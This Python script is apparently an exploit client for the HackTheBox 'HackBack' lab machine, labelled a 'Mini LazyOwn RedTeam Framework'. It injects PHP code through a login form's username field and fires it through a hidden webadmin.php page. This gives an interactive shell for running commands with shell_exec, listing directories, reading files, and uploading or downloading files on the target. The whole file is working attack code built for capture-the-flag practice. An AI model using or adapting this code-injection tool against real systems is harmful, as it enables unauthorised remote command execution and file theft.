#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
app.py

Autor: decoder & yuntao
Descripción:  CLI to HackBack Machine
"""

import requests
from cmd import Cmd
import sys
import re
import os
from base64 import b64encode, b64decode
import hashlib
import netifaces as ni

RESET = "\033[0m"
BOLD = "\033[1m"


BLINK = "\033[5m"

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"


def sendCmd(cmd):
    url = "http://www.hackthebox.htb"
    execc = "<?php "+ cmd + ";?>";
    params = {'_token' : '23HZyAY4Y8Z9wq1ntgvP8Yd', 'username' : execc,
    'password' : 'password', 'submit' : '' }
    requests.post( url, data=params )
def getOutput():
    url =    "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
    params = { "action": "show" , "site": "hackthebox" , "password"
    :"12345678", "session" : session }
    res = requests.get(url, params = params, allow_redirects= False)
    return ((res.content).decode("utf-8"))

def doReset():
    url =    "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
    params = { "action": "init" , "site": "hackthebox" , "password"
    :"12345678", "session": session }
    res = requests.get(url, params = params, allow_redirects= False)
def fixPath(path):
    if "C:" in path:
        path = path.replace("C:", "")
    if "\\" in path:
        path = path.replace("\\", "/")
    return path

class Terminal(Cmd):
    intro = "\n\nMini LazyOwn RedTeam Framework \n\nUse help or ? for commands\n\nBig Brother Github: https://github.com/grisuno/LazyOwn"

    ip = "10.10.10.128"
    prompt = f"""{YELLOW}┌─{YELLOW}[{RED}LazyOwn{WHITE}👽{CYAN}{ip}{YELLOW}]
    {YELLOW}└╼ {BLINK}{GREEN}{BOLD}${RESET} """.replace('    ','')
    def default(self, args):
        doReset()
        sendCmd(args)
        print(getOutput())
    
    def do_dir(self, args):
        'List files in specified directory'
        args = fixPath(args)
        cmd = "print_r(scandir(\"{}\"))".format(args)
        doReset()
        sendCmd(cmd)
        dirs = getOutput()
        m = re.search("\\([\\w\\W]*\\)", dirs)
        print("Directory Listing for {}\r\n".format(args))
        for i in m.group(0).splitlines():
            try:
                print(" "+i.split("=>")[1])
            except:
                print(" ")

    def do_cat(self, args):
        'Displays the contents of a specified file'
        args = fixPath(args)
        cmd = "echo file_get_contents(\"{}\");".format(args)
        doReset()
        sendCmd(cmd)
        content = getOutput()
        print(content)

    def do_rce(self, args):
        'rce whoami'
        args = fixPath(args)
        cmd = "echo shell_exec(\"{}\");".format(args)
        doReset()
        sendCmd(cmd)
        content = getOutput()
        print(content)

    def do_upload(self,args):
        'Upload file to remote. Usage: upload local path,remote path'
        local, remote = args.split(",")[0], args.split(",")[1]
        os.system("base64 {} > {}.b64".format(local, local))
        local = local + ".b64"
        content = open(local, "r").read()
        cmd = "file_put_contents(\"{}\",base64_decode(\"{}\"))".format(local,(b64encode(content.encode('utf-8')).decode("utf-8")))
        doReset()
        sendCmd(cmd)
        getOutput()
        cmd = "file_put_contents(\"{}\",base64_decode(file_get_contents(\"{}\"))); echo'uploaded'".format(fixPath(remote),local)
        doReset()
        os.system("rm {}".format(local))
        sendCmd(cmd)
        if 'uploaded' in getOutput():
            print("Uploaded Successfully!")
        else:
            print("There was an error uploading :(")
    
    def do_download(self, args):
        'Download file from remote. Usage: download remote path,local path'
        remote, local = args.split(",")[0], args.split(",")[1]
        cmd = "echo '<file>';echo(base64_encode(file_get_contents(\"{}\"))); echo '<file>'".format(fixPath(remote))
        doReset()
        sendCmd(cmd)
        b64File = re.search("<file>.*<file>", getOutput())
        content = b64File.group(0).replace("<file>", "")
        f = open(local, "wb+")
        f.write(b64decode(content.encode('utf-8')))
        print("Download complete")

    def do_exit(self, args):
        sys.exit(0)

def main():
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    p = ip.encode('utf-8')
    h = hashlib.new("sha256")
    h.update(p)
    global session
    session = h.hexdigest()
    t = Terminal()
    t.cmdloop()

if __name__ == '__main__':
    main()

